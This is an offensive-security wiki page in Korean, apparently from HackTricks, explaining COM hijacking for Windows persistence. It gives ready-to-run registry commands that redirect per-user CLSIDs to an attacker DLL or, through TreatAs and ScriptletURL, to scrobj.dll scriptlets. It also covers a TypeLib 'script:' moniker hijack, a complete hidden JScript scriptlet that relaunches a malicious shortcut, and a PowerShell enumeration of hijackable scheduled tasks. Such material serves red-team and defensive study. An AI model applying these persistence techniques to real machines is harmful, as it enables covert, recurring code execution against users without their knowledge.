# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 존재하지 않는 COM components 검색

HKCU의 값은 사용자가 수정할 수 있으므로 **COM Hijacking**은 **persistence mechanism**으로 사용될 수 있습니다. `procmon`을 사용하면 아직 존재하지 않으며 attacker가 생성할 수 있는 COM registry를 쉽게 찾을 수 있습니다. 일반적인 필터:

- **RegOpenKey** operations.
- _Result_가 **NAME NOT FOUND**인 경우.
- _Path_가 **InprocServer32**로 끝나는 경우.

hunting 중 유용한 변형:

- 누락된 **`LocalServer32`** keys도 찾습니다. 일부 COM classes는 out-of-process servers이며 DLL 대신 attacker-controlled EXE를 실행합니다.
- `InprocServer32` 외에도 **`TreatAs`** 및 **`ScriptletURL`** registry operations를 검색합니다. 최근 detection content와 malware writeups에서 이를 계속 언급하는 이유는 일반적인 COM registrations보다 훨씬 드물어 high-signal이기 때문입니다.
- registration을 HKCU에 clone할 때 원본 `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`의 정상적인 **`ThreadingModel`**을 복사합니다. 잘못된 model을 사용하면 activation이 중단되고 hijack이 쉽게 탐지될 수 있습니다.<sup>[[3]](#references)</sup>
- 64-bit systems에서는 64-bit 및 32-bit views를 모두 검사합니다(`procmon.exe` 대 `procmon64.exe`, `HKLM\Software\Classes` 대 `HKLM\Software\Classes\WOW6432Node`). 32-bit applications는 서로 다른 COM registration을 resolve할 수 있기 때문입니다.

사칭할 존재하지 않는 COM을 결정했다면 다음 commands를 실행합니다. _몇 초마다 load되는 COM을 사칭하기로 결정한 경우에는 과도할 수 있으므로 주의합니다._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijack 가능한 Task Scheduler COM components

Windows Tasks는 Custom Triggers를 사용해 COM objects를 호출하며, Task Scheduler를 통해 실행되므로 해당 작업이 언제 트리거될지 예측하기가 더 쉽습니다.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

출력을 확인한 후, 예를 들어 **사용자가 로그인할 때마다** 실행되는 항목을 선택할 수 있습니다.

이제 **HKEY\CLASSES\ROOT\CLSID**와 HKLM 및 HKCU에서 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**를 검색하면, 일반적으로 해당 값이 HKCU에 존재하지 않는다는 것을 확인할 수 있습니다.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
그러면 HKCU 항목만 생성하면 되며, 사용자가 로그인할 때마다 backdoor가 실행됩니다.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs`를 사용하면 하나의 CLSID를 다른 CLSID로 에뮬레이션할 수 있습니다.<sup>[[4]](#references)</sup> Offensive 관점에서는 원래 CLSID를 그대로 둔 채, `scrobj.dll`을 가리키는 두 번째 per-user CLSID를 생성한 다음 `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`를 사용해 실제 COM object를 malicious object로 redirect할 수 있습니다.

다음과 같은 경우에 유용합니다.

- target application이 logon 또는 app start 시 이미 안정적인 CLSID를 instantiate하는 경우
- 원래 `InprocServer32`를 교체하는 대신 registry-only redirect를 원하는 경우
- `ScriptletURL` value를 통해 local 또는 remote `.sct` scriptlet을 execute하려는 경우

Example workflow (public Atomic Red Team tradecraft 및 과거 COM registry abuse research를 바탕으로 수정):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll`은 `ScriptletURL` 값을 읽고 참조된 `.sct`를 실행하므로, payload를 로컬 파일로 유지하거나 HTTP/HTTPS를 통해 원격으로 가져올 수 있습니다.
- 원래 COM registration이 HKLM에 완전하고 안정적으로 존재하는 경우, 전체 tree를 복제하는 대신 작은 per-user redirect만 필요하므로 `TreatAs`가 특히 유용합니다.
- 자연스러운 trigger를 기다리지 않고 validation하려면, 대상 class가 STA activation을 지원하는 경우 `rundll32.exe -sta <ProgID-or-CLSID>`를 사용하여 fake ProgID/CLSID를 수동으로 instantiate할 수 있습니다.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib)는 COM interfaces를 정의하며 `LoadTypeLib()`를 통해 로드됩니다. COM server가 instantiate되면 OS는 `HKCR\TypeLib\{LIBID}` 아래의 registry keys를 참조하여 연결된 TypeLib도 로드할 수 있습니다. TypeLib path가 `script:C:\...\evil.sct`와 같은 **moniker**로 대체되면, TypeLib가 resolve될 때 Windows가 scriptlet을 실행하므로 일반적인 components가 사용될 때 trigger되는 은밀한 persistence가 가능합니다.

이는 Microsoft Web Browser control(Internet Explorer, WebBrowser를 embed하는 apps, 심지어 `explorer.exe`에서도 자주 로드됨)을 대상으로 관찰되었습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) 빈번하게 사용되는 CLSID가 사용하는 TypeLib (LIBID)를 식별합니다. Malware chains에서 자주 악용되는 CLSID 예시: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) 관리자 권한 없이 `script:` moniker를 사용하여 사용자별 TypeLib 경로가 로컬 scriptlet을 가리키도록 합니다:
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 주요 payload(예: 초기 chain에서 사용되는 `.lnk`)를 재실행하는 최소한의 JScript `.sct`를 배치합니다:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE, WebBrowser control을 포함하는 애플리케이션 또는 일반적인 Explorer 활동을 열면 TypeLib가 로드되고 scriptlet이 실행되어 logon/reboot 시 체인이 다시 활성화됩니다.

정리
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
참고
- 다른 high-frequency COM components에도 동일한 logic을 적용할 수 있습니다. 항상 먼저 `HKCR\CLSID\{CLSID}\TypeLib`에서 실제 `LIBID`를 확인하세요.
- 64-bit systems에서는 64-bit consumers를 위해 `win64` subkey를 추가할 수도 있습니다.

## 참고 문헌

- [1] [TypeLib Hijack – 새로운 COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: US 기업을 대상으로 한 정교한 Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking 재검토 (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
